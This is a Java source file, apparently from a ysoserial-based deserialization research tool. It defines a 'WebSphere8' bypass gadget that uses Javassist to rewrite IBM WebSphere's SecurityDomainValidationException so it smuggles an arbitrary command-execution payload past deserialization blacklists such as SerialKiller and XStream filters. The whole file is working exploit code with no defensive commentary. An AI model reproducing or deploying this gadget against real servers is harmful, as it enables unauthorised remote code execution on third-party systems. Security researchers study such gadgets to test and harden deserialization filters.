package serialkiller.bypass;

import com.ibm.wsspi.security.securitydomain.SecurityDomainValidationException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Reflections;
import java.lang.reflect.Constructor;

/**
 * Created by alvaro on 08/04/16.
 */

@Dependencies({ "websphere"} )
public class WebSphere8 implements BypassGadget {

    public Object wrapPayload(String command, Class payload) throws Exception {

        String payload_class = payload.getName();

        ClassPool pool = ClassPool.getDefault();
        CtClass c = pool.get("com.ibm.wsspi.security.securitydomain.SecurityDomainValidationException");
        CtClass objectOutputClass = pool.get("java.io.ObjectOutput");

        CtMethod writeExternalOrig = c.getDeclaredMethod("writeExternal");
        writeExternalOrig.setName("writeExternalDisabled");

        CtMethod writeExternalNew = new CtMethod(CtClass.voidType, "writeExternal", new CtClass[] {objectOutputClass}, c);
        String code = "{java.io.ByteArrayOutputStream bytesOut = new java.io.ByteArrayOutputStream();" +
                "java.io.ObjectOutputStream objOut = new java.io.ObjectOutputStream(bytesOut);" +
                "java.lang.Object payload = new " + payload_class + "().getObject(\"" + command + "\");" +
                "objOut.writeLong(1L);" +
                "objOut.writeUTF(this._bundle);" +
                "objOut.writeUTF(this._messageKey);" +
                "objOut.writeUTF(this._defaultMessage);" +
                "objOut.writeObject(payload);" +
                "$1.writeObject(bytesOut.toByteArray());" +
                "objOut.close();" +
                "bytesOut.close(); }";
        writeExternalNew.setBody(code);
        c.addMethod(writeExternalNew);
        Class instrumentedClass = c.toClass();
        Constructor ctor = instrumentedClass.getConstructor();
        SecurityDomainValidationException exception = (SecurityDomainValidationException) ctor.newInstance();
        Reflections.setFieldValue(exception, "_bundle", "");
        Reflections.setFieldValue(exception, "_defaultMessage", "");
        Reflections.setFieldValue(exception, "_messageKey", "");

        return exception;
    }

    public boolean bypassXStream() { return true; }
    public boolean skipTest() { return false; }
}

